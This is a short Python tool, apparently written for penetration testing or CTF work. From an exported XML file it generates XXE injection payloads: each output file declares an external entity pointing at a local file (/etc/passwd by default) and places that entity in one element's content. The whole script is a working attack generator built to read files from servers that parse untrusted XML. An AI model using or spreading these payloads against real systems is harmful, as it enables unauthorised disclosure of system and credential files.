import xml.etree.ElementTree as ET
import xml.dom.minidom
from lxml import etree
import os
import argparse
import html

#########################
# pip install lxml      #
#########################

def banner():
    banner = """
__  _ __  _ ___   ___  _  _        ___                             _            
\ \/  \ \/ | __> | __><_>| | ___  /  _>  ___ ._ _  ___  _ _  ___ _| |_ ___  _ _ 
 \ \   \ \ | _>  | _> | || |/ ._> | <_/\/ ._>| ' |/ ._>| '_><_> | | | / . \| '_>
_/\_\ _/\_\|___> |_|  |_||_|\___. `____/\___.|_|_|\___.|_|  <___| |_| \___/|_|  

Created by eMVee                                                                                
"""                                                                                
    return banner

print(banner())

# Parse command-line arguments
parser = argparse.ArgumentParser()
parser.add_argument("--file", help="Specify a file to read, default is /etc/passwd")
args = parser.parse_args()

def get_element_type(file):
    """
    Returns the the file to read.
    If the file argument is not provided, returns "/etc/passwd".
    """
    if file:
        return args.file
    else:
        return "/etc/passwd"

def replace_text(elem, text):
    if elem.text:
        elem.text = text
    for child in elem:
        replace_text(child, text)

# Parse the XML file
tree = ET.parse('export.xml')
root = tree.getroot()


# Iterate over each element in the XML file
for i, elem in enumerate(root):
    # Create a copy of the original tree
    new_tree = ET.ElementTree(ET.fromstring(ET.tostring(root, encoding='unicode')))
    # Get the root element of the new tree
    new_root = new_tree.getroot()
    # Replace the text content of the current element and all its child elements with "&QWERTY"

    replace_text(new_root[i], "&payload;")
    # Create a new filename based on the element index
    filename = f"output-{i}.xml"
    # Create a new XML file with the new filename
    with open(filename, 'w') as f:
        f.write('<?xml version="1.0"?>\n')
        f.write('<!DOCTYPE data [\n')
        f.write('   <!ELEMENT data ANY >\n')
        f.write('   <!ENTITY payload SYSTEM "file://%s">\n' % get_element_type(args.file))
        f.write(']>\n')
        # Write the modified XML element to the file
        # Use ET.tostring to convert the ElementTree to a string
        xml_string = ET.tostring(new_root, encoding='unicode')

        dom = xml.dom.minidom.parseString(xml_string)

        pretty_xml = dom.toprettyxml()


        f.write(pretty_xml)
        #new_tree.write(f, encoding='unicode', xml_declaration=False)
    print(f"[!] Created new XML file: {filename}")


# Get a list of all output files that start with 'output'
print("[!] Working on the files for a moment!")
output_files = [f for f in os.listdir('.') if f.startswith('output') and f.endswith('.xml')]
# Loop through each output file
for file in output_files:
    # Open the file in read mode
    with open(file, 'r') as f:
        # Read the contents of the file
        contents = f.read()
        # Replace all occurrences of '&amp;' with '&'
        contents = contents.replace('&amp;', '&')
        # Open the file in write mode
        with open(file, 'w') as f:
            # Write the modified contents back to the file
            f.write(contents)
print("[!] Done!")
